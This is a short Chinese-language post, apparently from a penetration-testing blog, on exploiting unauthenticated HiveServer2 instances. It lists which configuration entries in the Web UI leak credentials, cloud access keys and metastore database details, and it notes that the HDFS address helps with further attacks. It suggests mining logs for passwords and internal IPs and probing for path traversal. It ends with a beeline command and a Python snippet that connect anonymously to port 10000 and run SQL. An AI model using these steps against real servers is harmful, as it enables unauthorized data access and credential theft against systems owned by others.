**HiveServer未授权，其实除了nday外，最值钱的是它的配置**  
  
  
顶部的 Hive Configuration  
  
这里会列出 Hive 所有的配置项  
```
1、password、passwd、secret、key：可能会直接泄露元数据库（MySQL/PostgreSQL）的连接密码，或者云存储（S3/OSS）的 AccessKey
2、javax.jdo.option.ConnectionURL：查看元数据存储的数据库地址（通常是 MySQL）
3、javax.jdo.option.ConnectionUserName：元数据库的用户名
4、hive.server2.authentication：查看认证方式（如果是 NONE，说明完全没有认证）
5、fs.defaultFS：查看 HDFS 的地址，方便后续攻击 HDFS
6、hive.metastore.uris：元数据服务地址
```

其次可以看Local logs (本地日志)   
```
1、查看 HiveServer2 的运行日志。日志中经常包含异常堆栈（Stack Trace），可能会泄露
服务器绝对路径（如 /opt/hive/...）、Java 类名、甚至内部网络 IP
2、有时日志会记录连接失败的数据库密码
3、寻找日志文件的下载链接，如果存在路径遍历漏洞，可能可以下载服务器上的任意文件
```

直接连接并执行 SQL 查询，这与我们未授权访问  
Web UI 是相互印证的  
  
  
Web UI 只能看，不能执行任意 SQL。你需要连接它的 Thrift 服务端口（默认 **10000**  
）。由于密码是 anonymous  
，你可以直接连接试试  
  
  
方法 A：使用 Beeline 客户端  
```
beeline -u "jdbc:hive2://ip:10000/default" -n anonymous -p anonymous
```  
  
  
方法 B：使用 Python   
```
from pyhive import hive
conn = hive.Connection(host='ip', port=10000, username='anonymous', password='anonymous')
cursor = conn.cursor()
cursor.execute('SHOW DATABASES')
print(cursor.fetchall())
```
